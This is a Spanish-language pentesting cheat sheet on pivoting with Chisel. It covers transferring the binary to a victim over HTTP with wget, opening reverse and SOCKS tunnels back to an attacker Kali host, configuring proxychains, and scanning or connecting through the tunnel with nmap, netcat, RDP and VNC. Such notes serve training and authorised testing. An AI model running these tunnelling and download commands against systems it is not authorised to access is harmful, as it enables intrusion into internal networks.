# Pivoting con Chisel

Tags: #Chisel #PortForwarding #LocalForwarding #DinamicForwarding #Pivoting 

Permite redirigir todo el tráfico entrante de un puerto local hacia un puerto remoto.

* **Server -> Windows** 
* **Cliente -> Kali**

```bash
1. Descargar Chisel desde los 'Releases'
❯ https://github.com/jpillora/chisel


2. Reducir el tamaño al binario 'Chisel' para una transferencia más rapida
❯ du -hc chisel                   # Mirar el peso del binario
❯ upx Chisel                      # Reducir el tamaño del binario 


3. Transferir Chisel a la maquina víctima mediante un servidor 'HTTP' 
❯ python3 -m http.server 80       # Maquina de atacante 
❯ wget http://IP/chisel           # Maquina víctima 
```

## 1. Remote Port Forwarding

## 1.1 Crear un túnel con un puerto especifico 

```bash
❯ ./chisel server --reverse -p 1234       # Server 'Maquina Kali'

	# Port-Server = Puerto a abrir en Kali

❯ ./chisel client <IP-Server>:1234 R:<Port-Local-a-Abrir>:<IP-Local>:<Port-Traemos>    # Cliente 'Maquina víctima'

	# IP-Server = IP de Kali
	# Port-Server = Puerto de Kali = 1234
	# R = Remote Port Forwarding
	# Port-Local = Puerto que vamos a traer de la maquina víctima
	# IP-Local = IP del Localhost de la maquina víctima 
	# Port-Traemos = Puerto a abrir en Kali

Nota: Se crea un túnel utilizando un solo puerto con una IP especifica
```

## 1.2 Crear un túnel con todos los puertos 

```bash
# Crea un túnel desde la maquina Kali hacia la maquina víctima

❯ ./chisel server --reverse -p 1234                    # Server 'Maquina Kali'
❯ ./chisel client <IP-Server>:1234 R:socks             # Cliente 'Maquina víctima'

	# IP-Server = IP de Kali
	# Port-Server = Puerto de Kali
	# R = Remote Port Forwarding
     # socks = Abre el puerto 1080 de Kali y crea un tunel para llegar a la maquina víctima 

Nota: Se crea un túnel recibiendo todos los puertos de todos los segmentos de red
```

## Archivo a modificar después de crear el túnel 

```bash 
# Hacer los siguientes cambios después de crear el túnel 

❯ nvim /etc/proxychains.conf 

Nota: 
1. Deshabilitar comentando 'Dinamic_chain' ya que solo se habilita cuando se va a pasar por varios tuneles
2. Habilitar descomentando 'strick_chain' ya que solo se habilita cuando tenemos un túnel 
3. Hasta abajo del archivo agregar lo siguiente:

	sock5 127.0.0.1 1080 
	
```

## 2. Dinamic Port Forwarding 

```bash 
❯ ssh -D 1080 user@IP               # Conectarse por SSH creando un túnel dinámico en la máquina local. Por lo que cualquier conexión de red al puerto 1080 en tu computadora se redirigirá a través de la sesión SSH al servidor remoto

❯ netstat -ant | grep 1080          # Verificar la creación del túnel de manera local (modo: LISTENING)
```

```bash 
❯ nano /etc/proxychains.conf        # Modificar el archivo 'proxychains' y agregar lo siguiente:

	socks4 127.0.0.1 1080          # Comentar (# proxy_dns) y modificar el proxy en 'ProxyList'
```

## 3. Comandos con Proxychains

```bash 
Siempre se debe colocar 'proxychains' antes de cada comando por lo que hará el comando pase por el tunel creado por chisel

- NMAP
❯ seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n ❮Target IP❯ 2>&1 | grep "tcp open"

	# P = Tareas en paralelo

❯ proxychains nmap --top-ports 500 --open -T5 -v -n <IP> -sT -Pn -oG allports 2>&1 | grep -vE "timeout|OK"
❯ proxychains nmap -sT -Pn -sCV -p22,.. <IP> -oN Targeted | grep -vE "timeout|OK"


- WHATWEB
❯ proxychains whatweb IP          # Escaneo hacia la maquina víctima 


- NETCAT
❯ proxychains nc -nv IP 445       # Ejecutar netcat en el puerto 445
	# n = No aplicar DNS
	# v = Verbose 


- REMOTE DESKTOP
❯ proxychains rdesktop IP          # Conectarse por RDP utilizando un usuario y passwd validos. Este comando abrirá una ventana 'Windows' para hacer el login con las credenciales 


- VNCVIEWER
❯ proxychains vncviewer -passwd secret 127.0.0.1:5901   # Conectarse por vncviewer

	# secret = Archivo que contiene la passwd para la conexión
```